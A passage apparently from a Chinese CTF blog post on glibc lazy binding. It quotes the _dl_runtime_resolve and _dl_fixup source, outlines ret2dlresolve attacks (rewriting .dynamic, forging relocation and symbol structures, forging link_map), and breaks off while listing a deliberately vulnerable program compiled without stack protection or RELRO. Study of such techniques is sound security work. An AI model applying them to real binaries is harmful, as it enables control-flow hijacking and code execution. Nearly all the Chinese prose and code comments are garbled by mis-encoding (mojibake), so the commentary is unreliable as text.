class="keyword">bound</span> registers.  These are nops if</span><br><span class="line"># Intel MPX isn<span class="string">&#x27;t available or disabled.</span></span><br><span class="line"><span class="string"># ifdef HAVE_MPX_SUPPORT</span></span><br><span class="line"><span class="string">bndmov %bnd0, REGISTER_SAVE_BND0(%rsp)</span></span><br><span class="line"><span class="string">bndmov %bnd1, REGISTER_SAVE_BND1(%rsp)</span></span><br><span class="line"><span class="string">bndmov %bnd2, REGISTER_SAVE_BND2(%rsp)</span></span><br><span class="line"><span class="string">bndmov %bnd3, REGISTER_SAVE_BND3(%rsp)</span></span><br><span class="line"><span class="string"># else</span></span><br><span class="line"><span class="string">#  if REGISTER_SAVE_BND0 == 0</span></span><br><span class="line"><span class="string">.byte 0x66,0x0f,0x1b,0x04,0x24</span></span><br><span class="line"><span class="string">#  else</span></span><br><span class="line"><span class="string">.byte 0x66,0x0f,0x1b,0x44,0x24,REGISTER_SAVE_BND0</span></span><br><span class="line"><span class="string">#  endif</span></span><br><span class="line"><span class="string">.byte 0x66,0x0f,0x1b,0x4c,0x24,REGISTER_SAVE_BND1</span></span><br><span class="line"><span class="string">.byte 0x66,0x0f,0x1b,0x54,0x24,REGISTER_SAVE_BND2</span></span><br><span class="line"><span class="string">.byte 0x66,0x0f,0x1b,0x5c,0x24,REGISTER_SAVE_BND3</span></span><br><span class="line"><span class="string"># endif</span></span><br><span class="line"><span class="string">#endif</span></span><br><span class="line"><span class="string"># Copy args pushed by PLT in register.</span></span><br><span class="line"><span class="string"># %rdi: link_map, %rsi: reloc_index</span></span><br><span class="line"><span class="string">mov (LOCAL_STORAGE_AREA + 8)(%BASE), %RSI_LP</span></span><br><span class="line"><span class="string">mov LOCAL_STORAGE_AREA(%BASE), %RDI_LP</span></span><br><span class="line"><span class="string">call _dl_fixup# Call resolver.</span></span><br><span class="line"><span class="string">mov %RAX_LP, %R11_LP# Save return value</span></span><br><span class="line"><span class="string">#ifndef __ILP32__</span></span><br><span class="line"><span class="string"># Restore bound registers.  These are nops if Intel MPX isn&#x27;</span>t</span><br><span class="line"># avaiable <span class="keyword">or</span> disabled.</span><br><span class="line"># ifdef HAVE_MPX_SUPPORT</span><br><span class="line"><span class="keyword">bndmov</span> REGISTER_SAVE_BND3(%rsp), %bnd3</span><br><span class="line"><span class="keyword">bndmov</span> REGISTER_SAVE_BND2(%rsp), %bnd2</span><br><span class="line"><span class="keyword">bndmov</span> REGISTER_SAVE_BND1(%rsp), %bnd1</span><br><span class="line"><span class="keyword">bndmov</span> REGISTER_SAVE_BND0(%rsp), %bnd0</span><br><span class="line"># else</span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x1a</span>,<span class="number">0x5c</span>,<span class="number">0x24</span>,REGISTER_SAVE_BND3</span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x1a</span>,<span class="number">0x54</span>,<span class="number">0x24</span>,REGISTER_SAVE_BND2</span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x1a</span>,<span class="number">0x4c</span>,<span class="number">0x24</span>,REGISTER_SAVE_BND1</span><br><span class="line">#  if REGISTER_SAVE_BND0 == <span class="number">0</span></span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x1a</span>,<span class="number">0x04</span>,<span class="number">0x24</span></span><br><span class="line">#  else</span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x1a</span>,<span class="number">0x44</span>,<span class="number">0x24</span>,REGISTER_SAVE_BND0</span><br><span class="line">#  endif</span><br><span class="line"># endif</span><br><span class="line">#endif</span><br><span class="line"># Get register content back.</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_R9(%rsp), %r9</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_R8(%rsp), %r8</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_RDI(%rsp), %rdi</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_RSI(%rsp), %rsi</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_RDX(%rsp), %rdx</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_RCX(%rsp), %rcx</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_RAX(%rsp), %rax</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF)(%rsp), %VEC(<span class="number">0</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE)(%rsp), %VEC(<span class="number">1</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">2</span>)(%rsp), %VEC(<span class="number">2</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">3</span>)(%rsp), %VEC(<span class="number">3</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">4</span>)(%rsp), %VEC(<span class="number">4</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">5</span>)(%rsp), %VEC(<span class="number">5</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">6</span>)(%rsp), %VEC(<span class="number">6</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">7</span>)(%rsp), %VEC(<span class="number">7</span>)</span><br><span class="line">#if DL_RUNIME_RESOLVE_REALIGN_STACK</span><br><span class="line"><span class="keyword">mov</span> %RBX_LP, %RSP_LP</span><br><span class="line">cfi_def_cfa_register(%rsp)</span><br><span class="line"><span class="keyword">movq</span> (%rsp), %rbx</span><br><span class="line">cfi_restore(%rbx)</span><br><span class="line">#endif</span><br><span class="line"># Adjust stack(PLT did <span class="number">2</span> pushes)</span><br><span class="line"><span class="keyword">add</span> $(LOCAL_STORAGE_AREA + <span class="number">16</span>), %RSP_LP</span><br><span class="line">cfi_adjust_cfa_offset(-(LOCAL_STORAGE_AREA + <span class="number">16</span>))</span><br><span class="line"># Preserve <span class="keyword">bound</span> registers.</span><br><span class="line">PRESERVE_BND_REGS_PREFIX</span><br><span class="line"><span class="keyword">jmp</span> *%r11# Jump to function address.</span><br><span class="line">cfi_endproc</span><br><span class="line"><span class="meta">.size</span> _dl_runtime_resolve, .-_dl_runtime_resolve</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç çš„åŠŸèƒ½å°±æ˜¯ä¿å­˜å¯„å­˜å™¨çš„å€¼åˆ°æ ˆé‡Œ,ç„¶åè°ƒç”¨_dl_fixupæ‰§è¡Œå…·ä½“åŠŸèƒ½ï¼Œç„¶åä»æ ˆä¸­æ¢å¤å¯„å­˜å™¨ã€‚è€Œè°ƒç”¨_dl_fixupä¼ å…¥çš„å‚æ•°rdiæ˜¯link_map,rsiæ˜¯GOTä¸­å…³äºPLTé‡å®šä½çš„ç´¢å¼•ï¼Œåé¢æ ¹æ®è¯¥ç´¢å¼•å¯»æ‰¾è¦ä¼ å…¥çš„æ–°åœ°å€ã€‚æ‰€ä»¥åˆ†æ_dl_fixupå¯¹æˆ‘ä»¬äº†è§£_dl_runtime_resolveæ˜¯éå¸¸é‡è¦çš„ã€‚</p><h2 id="dl-fixupåˆ†æ"><a href="#dl-fixupåˆ†æ" class="headerlink" title="_dl_fixupåˆ†æ"></a>_dl_fixupåˆ†æ</h2><p>_dl_fixupæ˜¯å®šä¹‰å’Œå®ç°æ˜¯åœ¨\elf\dl-runtime.cä¸­ï¼Œå…ˆæ¥åˆ†æä¸€ä¸‹ä»£ç ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">   struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab</span></span><br><span class="line"><span class="function">    </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">    <span class="comment">//é€šè¿‡å®D_PTRè·å–è·å¾—åŠ¨æ€é“¾æ¥ç¬¦å·è¡¨çš„åœ°å€ï¼Œæ—¢å¾—åˆ°.dynsymçš„æŒ‡é’ˆã€‚</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"><span class="comment">//é€šè¿‡å®D_PTRè·å–è·å¾—åŠ¨æ€é“¾æ¥å­—ç¬¦ä¸²çš„åœ°å€ï¼Œæ—¢å¾—åˆ°.dynstrçš„æŒ‡é’ˆã€‚</span></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc</span><br><span class="line">    = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">//reloc_offsetå°±æ˜¯ä¼ è¿›æ¥çš„ç¬¬äºŒä¸ªå‚æ•°ï¼ŒGOTä¸­å…³äºPLTé‡å®šä½çš„ç´¢å¼•ï¼Œå°†.rel.pltçš„åœ°å€ä¸reloc_offsetç›¸åŠ ï¼Œå¾—åˆ°è¯¥å‡½æ•°çš„ELF32_Relçš„ç»“æ„ä½“æŒ‡é’ˆã€‚</span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">//å¾—åˆ°r_infoä¸­é‡Œä¿å­˜çš„é‡å®šä½å…¥å£ç¬¦å·åœ¨ç¬¦å·è¡¨çš„ä¸‹æ ‡ï¼Œä»è€Œè·å–å‡½æ•°å¯¹åº”ELF32_symçš„æŒ‡é’ˆã€‚</span></span><br><span class="line">  <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">    <span class="comment">//l-&gt;l_addrä¿å­˜çš„æ˜¯å…±äº«æ–‡ä»¶åŠ è½½çš„åŸºåœ°å€ã€‚è¿™é‡Œçš„rel_addræ˜¯åŸºåœ°å€l-&gt;l_addråŠ ä¸Šgotè¡¨åœ¨å…±äº«å¯¹è±¡çš„åç§»reloc-&gt;r_offsetï¼Œå¾—åˆ°æˆ‘ä»¬è¦ä¿®æ”¹çš„gotè¡¨æ‰€åœ¨çš„ä½ç½®ã€‚</span></span><br><span class="line">  <span class="keyword">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"><span class="comment">//è¿™é‡Œæ˜¯æ£€æŸ¥r_infoä¸­çš„é‡å®šä½å…¥å£ç±»å‹æ˜¯å¦æ˜¯R_386_JMP_SLOT,åŠ¨æ€é“¾æ¥ä¸­å‡½æ•°é‡å®šä½ä¸€èˆ¬éƒ½ä¸ºR_386_JMP_SLOTï¼Œä¹Ÿå°±æ˜¯7</span></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//è¿™é‡Œåˆ¤æ–­å‡½æ•°æ˜¯å¦è¢«è§£æè¿‡ï¼Œå¦‚æœ(sym-&gt;st_other)&amp;0x03ç»“æœä¸º0ï¼Œè¯´æ˜æ²¡æœ‰è§£æè¿‡ï¼Œä¸å±äºSTV_PROTECTEDã€STV_HIDDENæˆ–è€…STV_INTERNALå…¶ä¸­ä»»ä½•ä¸€ç§ã€‚</span></span><br><span class="line">      <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="comment">//è¿™éƒ¨åˆ†è·å–versionä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°versionæ˜¯ä½¿ç”¨æˆ‘ä»¬çš„r_infoè¿›è¡Œèµ‹å€¼ï¼Œå¦‚æœæˆ‘ä»¬r_infoçš„é‡å®šä½å…¥å£ç¬¦å·ä¸‹æ ‡å¼‚å¸¸ä»è€Œå¯¼è‡´ndxæ•°å€¼å¼‚å¸¸ï¼Œå¾ˆå¯èƒ½å¯¼è‡´l_versions[ndx]æ•°ç»„è¶Šç•Œåˆ°ä¸å¯è¯»ä½ç½®å¯¼è‡´ç¨‹åºå´©æºƒã€‚</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment"> not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment"> we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">&#123;</span><br><span class="line">  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment"> of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment"> offset.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">  + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment"> address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"><span class="comment">//è¿™ä¸€éƒ¨åˆ†å…ˆé€šè¿‡strtabï¼ˆå­—ç¬¦ä¸²è¡¨çš„åŸºåœ°å€ï¼‰åŠ ä¸Šst_nameï¼ˆå­—ç¬¦ä¸²å¯¹åº”å­—ç¬¦ä¸²è¡¨çš„ä¸‹æ ‡ï¼‰å¾—åˆ°å‡½æ•°çš„å­—ç¬¦ä¸²ï¼Œä»å·²ç»è£…è½½çš„å…±äº«åº“æ‰¾åˆ°æœ€ç»ˆç¬¦å·çš„åœ°å€ï¼Œå¾—åˆ°ç¬¦å·å¯¹å…¶é‡å®šä½ï¼ŒåŠ ä¸Šlibcçš„è£…è½½åœ°å€å¾—åˆ°æœ€ç»ˆåœ°å€ï¼Œä¿å­˜åœ¨valueä¸­</span></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">    <span class="comment">//è¿™éƒ¨åˆ†æ˜¯ä½¿ç”¨elf_machine_fixup_pltå¯¹å‡½æ•°åœ°å€è¿›è¡Œä¿®æ­£ï¼Œå°†å‡½æ•°çœŸå®åœ°å€å†™å…¥gotè¡¨</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ€»ç»“ä¸€ä¸‹åˆšåˆšåˆ†æå¥½çš„_dl_runtime_resolveè¿‡ç¨‹</p><ol><li>é¦–å…ˆè·å–åé¢éœ€è¦ä½¿ç”¨çš„åœ°å€ï¼š<ul><li>é€šè¿‡å®D_PTRè·å–è·å¾—åŠ¨æ€é“¾æ¥ç¬¦å·è¡¨çš„åœ°å€ï¼ŒåŠ¨æ€é“¾æ¥å­—ç¬¦ä¸²</li><li>è·å–.rel.pltçš„åœ°å€ï¼Œå°†.rel.pltçš„åœ°å€ä¸reloc_offsetç›¸åŠ ï¼Œå¾—åˆ°è¯¥å‡½æ•°çš„ELF32_Relçš„ç»“æ„ä½“æŒ‡é’ˆ</li><li>å¾—åˆ°r_infoä¸­é‡Œä¿å­˜çš„é‡å®šä½å…¥å£ç¬¦å·åœ¨ç¬¦å·è¡¨çš„ä¸‹æ ‡ï¼Œä»è€Œè·å–å‡½æ•°å¯¹åº”ELF32_symçš„æŒ‡é’ˆã€‚</li><li>åŸºåœ°å€l-&gt;l_addråŠ ä¸Šgotè¡¨åœ¨å…±äº«å¯¹è±¡çš„åç§»reloc-&gt;r_offsetï¼Œå¾—åˆ°æˆ‘ä»¬è¦ä¿®æ”¹çš„gotè¡¨æ‰€åœ¨çš„ä½ç½®ã€‚</li></ul></li><li>æ¥ä¸‹æ¥åšä¸€äº›æ£€æŸ¥ï¼š<ul><li>æ£€æŸ¥r_infoä¸­çš„é‡å®šä½å…¥å£ç±»å‹æ˜¯å¦æ˜¯R_386_JMP_SLOT</li><li>åˆ¤æ–­å‡½æ•°æ˜¯å¦è¢«è§£æè¿‡ï¼Œæ˜¯å¦å±äºå±äºSTV_PROTECTEDã€STV_HIDDENæˆ–è€…STV_INTERNALå…¶ä¸­ä»»ä½•ä¸€ç§ã€‚</li></ul></li><li>ç´§æ¥ç€è·å–versionä¿¡æ¯ï¼Œé€šè¿‡strtabï¼ˆå­—ç¬¦ä¸²è¡¨çš„åŸºåœ°å€ï¼‰åŠ ä¸Šst_nameï¼ˆå­—ç¬¦ä¸²å¯¹åº”å­—ç¬¦ä¸²è¡¨çš„ä¸‹æ ‡ï¼‰å¾—åˆ°å‡½æ•°çš„å­—ç¬¦ä¸²ï¼Œä»å·²ç»è£…è½½çš„å…±äº«åº“æ‰¾åˆ°æœ€ç»ˆç¬¦å·çš„åœ°å€ï¼Œå¾—åˆ°ç¬¦å·å¯¹å…¶é‡å®šä½ï¼ŒåŠ ä¸Šlibcçš„è£…è½½åœ°å€å¾—åˆ°æœ€ç»ˆåœ°å€ï¼Œä¿å­˜åœ¨valueä¸­ï¼Œæœ€åå¯¹å‡½æ•°åœ°å€è¿›è¡Œä¿®æ­£ï¼Œå°†å‡½æ•°çœŸå®åœ°å€å†™å…¥gotè¡¨</li></ol><p>äº†è§£äº†_dl_runtime_resolveçš„åŸºæœ¬è¿‡ç¨‹ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹çœ‹æ”»å‡»çš„æ‰‹æ³•å§</p><h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><h2 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h2><p>ä»æœ€ç›´æ¥çš„è§’åº¦å»æƒ³ç›´æ¥å»ä¿®æ”¹.dynsymã€.dynstræˆ–è€…æ˜¯ä¿®æ”¹.rel.pltï¼Œä½†æ˜¯å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œæˆ‘ä»¬ä¼šå‘ç°è¿™äº›segmentæ˜¯ä¸å¯å†™çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ— æ³•é€šè¿‡ä¿®æ”¹å®ƒä»¬è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ã€‚</p><ol><li><p>è®©æˆ‘ä»¬æ¢ä¸ªæ€è·¯ï¼Œæ—¢ç„¶ä¸èƒ½ç›´æ¥æ”¹å†™è¿™äº›segmentï¼Œæ˜¯å¦å¯ä»¥é—´æ¥æ§åˆ¶åˆ°å®ƒä»¬é‚£ï¼Ÿçœ‹çœ‹_dl_runtime_resolveè¿‡ç¨‹çš„ç¬¬ä¸€æ­¥ï¼Œæ‰€æœ‰çš„åœ°å€ç´¢å¼•éƒ½æ˜¯ä»<strong>.dynamic</strong>å¼€å§‹çš„,ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¦‚æœæ§åˆ¶äº†.dynamicä¹Ÿå°±æ§åˆ¶äº†æ•´ä¸ªåŠ¨æ€é“¾æ¥çš„è¿‡ç¨‹ï¼Œä¹Ÿå°±å¯ä»¥å®ç°æ‰§è¡Œç›®æ ‡ä»£ç ã€‚æ¯”å¦‚æˆ‘ä»¬é€šè¿‡å…¶åŠ«æŒåˆ°strtabï¼Œæˆ‘ä»¬æ—¢å¯ä»¥æ ¹æ®st_nameçš„åç§»ä¼ªé€ å‡ºå­—ç¬¦ä¸²è¡¨ï¼Œæ¯”å¦‚å°†writeçš„åç§»åœ°æ–¹å†™ä¸Šsystemï¼Œè¿™æ ·å°±å¯ä»¥åˆ°è¾¾æˆ‘ä»¬æ‰§è¡Œç›®çš„å‡½æ•°çš„ç›®æ ‡ã€‚ä½†æ˜¯è¿™ç§æ–¹æ³•çš„å±€é™æ€§è¾ƒå¼ºï¼Œå¾—No RELROæ‰è¡Œ</p></li><li><p>å†è€…æˆ‘ä»¬å…ˆä¼ªé€ å‡º<strong>Elf32_Rel</strong>å’Œ<strong>Elf32_Sym</strong>ä¸¤ä¸ªç»“æ„ä½“ï¼Œå¹¶ä¼ å…¥çš„è™šå‡çš„reloc_offsetå‚æ•°ï¼Œæˆ‘ä»¬å¯¹reloc_offsetåšä¸€ä¸ªä¿®æ”¹ä½¿å¾—å…¶ä½ç½®å‘ç”Ÿåç§»ï¼Œé€šè¿‡è™šå‡çš„reloc_argä½¿å¾—ç¨‹åºæµè¯»å–æˆ‘ä»¬ä¼ªé€ çš„ç»“æ„ä½“ï¼Œè¿›è€Œå–å¾—æˆ‘ä»¬ä¼ªé€ çš„åç§»é‡ï¼Œæœ€ç»ˆå–å¾—ä¼ªé€ çš„å‡½æ•°å­—ç¬¦ä¸²ã€‚è¿™æ ·ä¹Ÿå¯ä»¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ï¼Œä½†æ˜¯è¦æ³¨æ„è¿™ç§æ–¹æ³•å­˜åœ¨ä¸€å®šçš„é—®é¢˜ï¼Œå…¶ä¸èƒ½ç”¨äºx64çš„æ¶æ„åœ¨ä¸Šé¢åˆ†æçš„ä»£ç é‡Œæœ‰è¿™æ ·ä¸€æ®µ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åœ¨64ä½æ¡ä»¶ä¸‹ï¼Œæˆ‘ä»¬ç¨‹åºçš„bssæ®µæ˜¯è¢«æ˜ å°„åˆ°0x600000çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¼ªé€ çš„.dynsymä¹Ÿä¼šåœ¨è¿™ä¸ªåœ°å€ä¹‹åï¼Œè€Œd_ptræ˜¯åœ¨0x400000ï¼Œè¿™æ ·åœ¨å–ä¸‹æ ‡çš„æ—¶å€™å¾ˆå¯èƒ½ä¼šå¾ˆå¤§ä»è€Œå–åˆ°äºŒè€…ä¹‹é—´çš„ä¸å¯è¯»åŒºåŸŸ</p></li><li><p>æˆ‘ä»¬è¿˜æ˜¯çœ‹çœ‹_dl_runtime_resolveçš„ç¬¬ä¸€æ­¥ï¼Œå¯ä»¥çœ‹åˆ°é™¤äº†.dynamicä¹‹å¤–ï¼Œæˆ‘ä»¬ç´¢å¼•ä¹Ÿé€šè¿‡D_PTRï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬<strong>ä¼ªé€ link_map</strong>ï¼Œä¹Ÿå°±å¯ä»¥åšåˆ°æ§åˆ¶ç¨‹åºåˆ°ç›®çš„å‡½æ•°ã€‚</p></li></ol><h2 id="æ”»å‡»å®æˆ˜"><a href="#æ”»å‡»å®æˆ˜" class="headerlink" title="æ”»å‡»å®æˆ˜"></a>æ”»å‡»å®æˆ˜</h2><h3 id="32ä½ä¸‹é€šè¿‡ä¿®æ”¹-dynamicè¿›è¡Œæ”»å‡»ï¼ˆNO-RELORï¼‰"><a href="#32ä½ä¸‹é€šè¿‡ä¿®æ”¹-dynamicè¿›è¡Œæ”»å‡»ï¼ˆNO-RELORï¼‰" class="headerlink" title="32ä½ä¸‹é€šè¿‡ä¿®æ”¹.dynamicè¿›è¡Œæ”»å‡»ï¼ˆNO RELORï¼‰"></a>32ä½ä¸‹é€šè¿‡ä¿®æ”¹.dynamicè¿›è¡Œæ”»å‡»ï¼ˆNO RELORï¼‰</h3><p>æˆ‘ä»¬å…ˆå®éªŒä¸€ä¸‹ç¬¬ä¸€ç§æ”»å‡»æ–¹å¼ï¼Œç”±äºæ²¡æœ‰ç°æˆçš„ç¨‹åºï¼Œæ‰€ä»¥æˆ‘æ”¹å†™äº†ä¸€ä¸‹XMan2016çš„level3</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -fno-stack-protector -m32 -z norelro -no-pie level3.c -o level3_norelro_32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> 